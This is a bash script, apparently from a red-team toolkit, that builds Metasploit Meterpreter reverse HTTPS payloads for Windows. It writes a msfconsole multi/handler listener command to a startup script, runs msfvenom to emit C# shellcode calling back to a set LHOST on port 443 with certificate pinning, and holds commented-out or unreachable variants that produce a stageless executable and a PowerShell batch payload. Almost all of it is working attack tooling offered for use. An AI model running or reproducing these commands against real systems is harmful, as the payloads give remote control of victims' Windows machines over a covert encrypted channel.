#!/usr/bin/bash
# Used for generating a secure stageless executable
# Assumes a cert is generated at /opt/CERT.pem

. ./generate_cert.sh
. ./set_env.sh

## get local ip address, does not work well with multiple interfaces
LOCAL_IP="$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')"
LOCAL_IP="10.0.0.181"
echo "Local: $LOCAL_IP"
echo

## am I root
COMMAND="whoami"
echo "$COMMAND:" \ $($COMMAND)
echo

START_HANDLER="sudo msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST $PUBLIC_IP; set LPORT 443; set HandlerSSLCert /opt/CERT.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'"
START_HANDLER="sudo msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST $LOCAL_IP; set LPORT 443; set HandlerSSLCert /opt/CERT.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'"
echo
echo $START_HANDLER
echo $START_HANDLER > /opt/start_listener_stageless.sh
echo

################################################################################

## stageless executable
echo "Generating stageless executable..."
#COMMAND="msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_https LHOST=$PUBLIC_IP LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/opt/CERT.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless EXITFUNC=thread -f exe -o /opt/launch-paranoid-stageless.exe"
#COMMAND="msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_https LHOST=$LOCAL_IP LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/opt/CERT.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless SessionExpirationTimeout=0 SessionCommunicationTimeout=0 SessionRetryWait=180 SessionRetryTotal=0 EXITFUNC=thread -f exe -o /opt/launch-paranoid-stageless.exe"
#echo "$COMMAND:" \ $($COMMAND)

## generate charp shell code
COMMAND="msfvenom -a x86 --platform windows  -b '\x00\xff' -p windows/meterpreter/reverse_winhttps LHOST=$LOCAL_IP LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/opt/CERT.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f csharp -o /opt/csharp_$LOCAL_IP.out"
echo "$COMMAND:" \ $($COMMAND)

################################################################################

exit
## gen psh cert payload for public ip
# over size limit
COMMAND="msfvenom -a x86 --platform windows  -b '\x00\xff' -p windows/meterpreter/reverse_winhttps LHOST=$PUBLIC_IP LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/opt/CERT.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat"
echo $COMMAND
$($COMMAND)


## gen psh cert payload for local ip

